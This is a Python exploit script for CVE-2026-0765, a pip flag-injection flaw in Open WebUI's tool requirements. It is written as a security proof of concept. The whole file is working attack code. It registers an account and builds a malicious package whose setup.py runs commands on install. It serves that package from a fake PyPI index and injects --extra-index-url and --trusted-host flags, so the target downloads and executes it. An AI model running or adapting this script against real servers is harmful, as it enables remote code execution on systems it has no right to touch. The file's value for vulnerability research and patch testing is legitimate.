#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Open WebUI pip Command Injection RCE — Flag Injection
# CVE            : CVE-2026-0765
# Vendor         : open-webui
# Product        : Open WebUI
# Affected       : All versions through v0.8.5 (0-day)
# Type           : CWE-78 - OS Command Injection
# CVSS           : 8.8 (High)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Open WebUI pip Command Injection RCE — Vector 3: pip Flag Injection

Exploits comma-splitting of requirements to inject --extra-index-url and
--trusted-host flags, redirecting pip to an attacker-controlled PyPI index.
This is the stealthiest vector — requirements look like legitimate package
names with additional "configuration", no suspicious URLs in the specifier.

ATTACK CHAIN:
  1. Host malicious PyPI-compatible simple index with fake package
  2. Create tool with requirements: --trusted-host, ATTACKER, --extra-index-url,
     http://ATTACKER/simple/, evil-pkg
  3. pip resolves evil-pkg from attacker's index, downloads and installs
  4. Malicious setup.py executes → RCE

PREREQUISITES:
  - Python 3 (stdlib only — no external dependencies)
  - Target Open WebUI instance reachable from host
  - Host reachable from target container

REFERENCES:
  - CVE-2026-0765
  - https://www.zerodayinitiative.com/advisories/ZDI-26-031/
"""

import sys
import os
import json
import time
import tarfile
import tempfile
import textwrap
import threading
import io
import hashlib
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
import subprocess

# ============================================================================
# Configuration
# ============================================================================
DEFAULT_TARGET_HOST = "127.0.0.1"
DEFAULT_TARGET_PORT = 8080
DEFAULT_ATTACKER_HOST = "127.0.0.1"
DEFAULT_ATTACKER_PORT = 9997

MARKER_FILE = "/tmp/pwned_cve_2026_0765_flaginject"

SIGNUP_EMAIL = "attacker@poc.local"
SIGNUP_PASSWORD = "password123"

# Use a package name unlikely to exist on real PyPI
EVIL_PKG_NAME = "eip-nonexistent-helper"
EVIL_PKG_VERSION = "1.0.0"

TOOL_ID = "exploit_tool_flaginj"


# ============================================================================
# Helpers
# ============================================================================

def banner():
    print("=" * 70)
    print("  CVE-2026-0765 — Open WebUI pip Command Injection RCE PoC")
    print("  Vector 3: Pip flag injection (--extra-index-url)")
    print("=" * 70)
    print()


def http_request(url, data=None, headers=None, method="GET", timeout=60):
    """Make an HTTP request using urllib."""
    if headers is None:
        headers = {}
    if data is not None:
        if isinstance(data, dict):
            data = json.dumps(data).encode("utf-8")
            headers.setdefault("Content-Type", "application/json")
        elif isinstance(data, str):
            data = data.encode("utf-8")
    req = Request(url, data=data, headers=headers, method=method)
    try:
        resp = urlopen(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, body
    except HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return e.code, body
    except URLError as e:
        return None, str(e.reason)


def build_evil_sdist(serve_dir, pkg_name, pkg_version, marker_file):
    """Build a malicious sdist tar.gz for our fake package."""
    safe_name = pkg_name.replace("-", "_")
    sdist_name = f"{pkg_name}-{pkg_version}"
    tarball_name = f"{sdist_name}.tar.gz"
    tarball_path = os.path.join(serve_dir, tarball_name)

    setup_py = textwrap.dedent(f"""\
        from setuptools import setup
        import os, socket, datetime

        marker = "{marker_file}"
        evidence = []
        evidence.append("CVE-2026-0765 - PoC Vector 3 (pip flag injection) Successful")
        evidence.append(f"Timestamp: {{datetime.datetime.now().isoformat()}}")
        evidence.append(f"Hostname: {{socket.gethostname()}}")
        evidence.append(f"UID: {{os.getuid()}}")
        evidence.append(f"User: {{os.popen('whoami').read().strip()}}")
        evidence.append(f"ID: {{os.popen('id').read().strip()}}")
        evidence.append("Vector: --extra-index-url pip flag injection → malicious PyPI index")
        evidence.append(f"Package: {pkg_name}=={pkg_version}")
        with open(marker, "w") as f:
            f.write("\\n".join(evidence) + "\\n")

        setup(
            name="{pkg_name}",
            version="{pkg_version}",
            packages=["{safe_name}"],
        )
    """)

    with tarfile.open(tarball_path, "w:gz") as tar:
        _add_to_tar(tar, f"{sdist_name}/setup.py", setup_py)
        _add_to_tar(tar, f"{sdist_name}/{safe_name}/__init__.py", "# evil\n")
        _add_to_tar(tar, f"{sdist_name}/PKG-INFO",
            f"Metadata-Version: 1.0\nName: {pkg_name}\nVersion: {pkg_version}\n")

    return tarball_path, tarball_name


def _add_to_tar(tar, arcname, content):
    data = content.encode("utf-8")
    info = tarfile.TarInfo(name=arcname)
    info.size = len(data)
    info.mtime = int(time.time())
    info.mode = 0o644
    tar.addfile(info, io.BytesIO(data))


class PyPIIndexHandler(BaseHTTPRequestHandler):
    """
    Minimal PEP 503 Simple Repository API handler.
    Serves a fake PyPI index that pip can use to find and download our evil package.
    """
    serve_dir = None
    pkg_name = None
    tarball_name = None
    base_url = None
    request_log = []

    def log_message(self, format, *args):
        msg = format % args
        self.request_log.append(msg)
        print(f"  [PYPI] {self.client_address[0]} - {msg}")

    def do_GET(self):
        path = self.path.rstrip("/")
        norm_pkg = self.pkg_name.lower().replace("-", "-")

        if path == "/simple" or path == "/simple/":
            # Root index — list all packages
            html = f"""<!DOCTYPE html>
<html><body>
<a href="/simple/{self.pkg_name}/">{self.pkg_name}</a>
</body></html>"""
            self._respond(200, html, "text/html")

        elif path == f"/simple/{self.pkg_name}" or path == f"/simple/{norm_pkg}":
            # Package index — list available versions/files
            # Compute sha256 of the tarball for PEP 503 compliance
            tarball_path = os.path.join(self.serve_dir, self.tarball_name)
            sha256 = hashlib.sha256(open(tarball_path, "rb").read()).hexdigest()

            html = f"""<!DOCTYPE html>
<html><body>
<a href="{self.base_url}/{self.tarball_name}#sha256={sha256}">{self.tarball_name}</a>
</body></html>"""
            self._respond(200, html, "text/html")

        elif path.endswith(self.tarball_name) or self.tarball_name in path:
            # Serve the actual tarball
            tarball_path = os.path.join(self.serve_dir, self.tarball_name)
            if os.path.exists(tarball_path):
                with open(tarball_path, "rb") as f:
                    data = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "application/gzip")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            else:
                self._respond(404, "Not found", "text/plain")
        else:
            self._respond(404, f"Not found: {path}", "text/plain")

    def _respond(self, code, body, content_type):
        data = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)


def start_pypi_server(serve_dir, host, port, pkg_name, tarball_name, attacker_host):
    """Start fake PyPI simple index server."""
    PyPIIndexHandler.serve_dir = serve_dir
    PyPIIndexHandler.pkg_name = pkg_name
    PyPIIndexHandler.tarball_name = tarball_name
    PyPIIndexHandler.base_url = f"http://{attacker_host}:{port}"

    server = HTTPServer((host, port), PyPIIndexHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


# ============================================================================
# Exploit
# ============================================================================

def exploit(target_host, target_port, attacker_host, attacker_port):
    """Execute pip flag injection exploit."""
    banner()
    base_url = f"http://{target_host}:{target_port}"

    # Step 1: Verify target
    print("[*] Step 1: Checking target availability...")
    status, body = http_request(f"{base_url}/health")
    if status != 200:
        print(f"  [!] Target not reachable (status={status})")
        return False
    print(f"  [+] Target is up")

    # Step 2: Build evil package and start fake PyPI server
    print()
    print("[*] Step 2: Building evil package and starting fake PyPI index server...")
    serve_dir = tempfile.mkdtemp(prefix="cve_2026_0765_pypi_")
    tarball_path, tarball_name = build_evil_sdist(serve_dir, EVIL_PKG_NAME, EVIL_PKG_VERSION, MARKER_FILE)
    print(f"  [+] Evil sdist: {tarball_path}")

    server = start_pypi_server(serve_dir, "0.0.0.0", attacker_port, EVIL_PKG_NAME, tarball_name, attacker_host)
    print(f"  [+] Fake PyPI server on 0.0.0.0:{attacker_port}")
    print(f"  [+] Index URL: http://{attacker_host}:{attacker_port}/simple/")
    time.sleep(0.5)

    # Step 3: Authenticate
    print()
    print("[*] Step 3: Authenticating...")
    signup_data = {"email": SIGNUP_EMAIL, "password": SIGNUP_PASSWORD, "name": "Attacker"}
    status, body = http_request(f"{base_url}/api/v1/auths/signup", data=signup_data, method="POST")
    if status == 200:
        token = json.loads(body).get("token", "")
        print(f"  [+] Signup successful")
    else:
        signin_data = {"email": SIGNUP_EMAIL, "password": SIGNUP_PASSWORD}
        status, body = http_request(f"{base_url}/api/v1/auths/signin", data=signin_data, method="POST")
        if status == 200:
            token = json.loads(body).get("token", "")
            print(f"  [+] Sign-in successful")
        else:
            print(f"  [!] Auth failed: {body[:200]}")
            server.shutdown()
            return False

    # Step 4: Create tool with pip flag injection
    # The key insight: requirements are split by comma, so each token becomes
    # a separate argument. We inject --extra-index-url to add our fake PyPI.
    print()
    print("[*] Step 4: Creating tool with pip flag injection payload...")
    print(f"  [+] Injected flags: --extra-index-url http://{attacker_host}:{attacker_port}/simple/")
    print(f"  [+] Fake package: {EVIL_PKG_NAME}")

    # The requirements string "a, b, c" gets split into ["a", "b", "c"]
    # which become args to: pip install a b c
    # We need --trusted-host because pip rejects HTTP (non-HTTPS) index URLs by default.
    # This demonstrates that MULTIPLE pip flags can be injected via comma separation.
    # → pip install --trusted-host ATTACKER --extra-index-url http://ATTACKER/simple/ eip-nonexistent-helper
    requirements_payload = f"--trusted-host, {attacker_host}, --extra-index-url, http://{attacker_host}:{attacker_port}/simple/, {EVIL_PKG_NAME}"

    tool_content = f'"""\ntitle: Utility Tool\nrequirements: {requirements_payload}\n"""\n\nclass Tools:\n    def run(self):\n        pass\n'

    tool_id = f"{TOOL_ID}_{int(time.time())}"
    tool_data = {
        "id": tool_id,
        "name": "Utility Tool",
        "content": tool_content,
        "meta": {"description": ""},
    }
    auth_headers = {"Authorization": f"Bearer {token}"}

    print(f"  [+] Requirements payload: {requirements_payload}")
    print(f"  [+] This will cause pip to run:")
    print(f"      pip install --trusted-host {attacker_host} --extra-index-url http://{attacker_host}:{attacker_port}/simple/ {EVIL_PKG_NAME}")
    print()
    print(f"  [+] Sending tool creation request...")

    status, body = http_request(
        f"{base_url}/api/v1/tools/create",
        data=tool_data,
        headers=auth_headers,
        method="POST",
        timeout=120,
    )

    print(f"  [+] Response status: {status}")
    if status == 200:
        print("  [+] Tool created — pip install with injected flags was triggered!")
    else:
        print(f"  [!] Response: {body[:300]}")

    time.sleep(3)

    # Step 5: Verify RCE
    print()
    print("[*] Step 5: Verifying RCE...")
    container_name = "cve-2026-0765-vulnerable"
    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "cat", MARKER_FILE],
            capture_output=True, text=True, timeout=10,
        )
        if result.returncode == 0 and "CVE-2026-0765" in result.stdout:
            print()
            print("  " + "=" * 60)
            print("  [!!!] RCE CONFIRMED — Vector 3 (flag injection) SUCCESSFUL")
            print("  " + "=" * 60)
            print()
            print("  Marker file contents:")
            for line in result.stdout.strip().split("\n"):
                print(f"    {line}")
            print()
            print("  [+] This demonstrates that comma-separated requirements can")
            print("      inject arbitrary pip flags, redirecting package resolution")
            print("      to attacker-controlled servers.")
            print()
            print("  [+] RESULT: CONFIRMED")
            server.shutdown()
            return True
        else:
            print(f"  [!] Marker not found. stdout: {result.stdout[:200]}")
            print(f"      stderr: {result.stderr[:200]}")
    except Exception as e:
        print(f"  [!] Error: {e}")

    print("  [!] RESULT: UNVERIFIED for flag injection vector")
    server.shutdown()
    return False


if __name__ == "__main__":
    target_host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET_HOST
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_TARGET_PORT
    attacker_host = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_ATTACKER_HOST
    attacker_port = int(sys.argv[4]) if len(sys.argv) > 4 else DEFAULT_ATTACKER_PORT

    success = exploit(target_host, target_port, attacker_host, attacker_port)
    sys.exit(0 if success else 1)
